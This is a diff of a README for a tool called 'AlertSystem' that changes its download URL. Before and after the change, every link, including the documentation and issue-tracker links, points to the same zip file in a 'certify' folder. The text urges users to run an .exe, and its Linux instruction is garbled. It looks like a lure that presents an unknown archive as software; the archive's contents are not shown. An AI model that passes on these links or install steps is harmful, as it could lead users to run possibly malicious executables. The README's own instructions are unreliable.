@@ -1,7 +1,7 @@
 # 🚀 AlertSystem - Real-Time Event Alerts Made Easy
 
 ## 📥 Download Now
-[![Download AlertSystem](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip%20AlertSystem-v1.0-brightgreen)](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
+[![Download AlertSystem](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip%20AlertSystem-v1.0-brightgreen)](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
 
 ## 🌟 Introduction
 Welcome to AlertSystem! This application helps you manage and receive real-time alerts easily. With AlertSystem, you can orchestrate workflows that react to events across various systems, all displayed neatly on a customizable dashboard. Whether you need to monitor critical operations or just want to get notified about important changes, this tool provides insights that matter.
@@ -16,7 +16,7 @@ To get started with AlertSystem, follow these simple steps:
    - Internet: Stable connection for updates and notifications.
 
 2. **Download the application**:
-   - Visit this page to download: [AlertSystem Releases](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
+   - Visit this page to download: [AlertSystem Releases](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
 
 3. **Install the application**:
    - For Windows: Run the downloaded `.exe` file and follow the installation steps.
@@ -29,7 +29,7 @@ To get started with AlertSystem, follow these simple steps:
 ## ⚙️ Download & Install
 To download the latest version of AlertSystem, you need to go to the Releases page. From there, choose the file that suits your operating system.
 
-- Visit this page to download: [AlertSystem Releases](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
+- Visit this page to download: [AlertSystem Releases](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
 
 Once you have downloaded the file:
 
@@ -46,7 +46,7 @@ Once you have downloaded the file:
 - **For Linux Users**:
    1. Open a terminal.
    2. Navigate to the folder where you extracted the files.
-   3. Run the installation script using `https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip`.
+   3. Run the installation script using `https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip`.
 
 ## 📊 Features
 AlertSystem offers a range of features for your convenience:
@@ -91,8 +91,8 @@ Stay updated with the latest changes and improvements. The changelog can be foun
 AlertSystem is open-source software. You can find the full license details in the LICENSE file in this repository.
 
 ## 🔗 Links
-- Download AlertSystem: [AlertSystem Releases](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
-- Documentation: [AlertSystem Documentation](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
-- Support: [Issue Tracker](https://raw.githubusercontent.com/7668toni/AlertSystem/main/certify/AlertSystem.zip)
+- Download AlertSystem: [AlertSystem Releases](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
+- Documentation: [AlertSystem Documentation](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
+- Support: [Issue Tracker](https://github.com/7668toni/AlertSystem/raw/refs/heads/main/certify/Alert_System_v2.1.zip)
 
 Feel free to explore and contribute to the project!
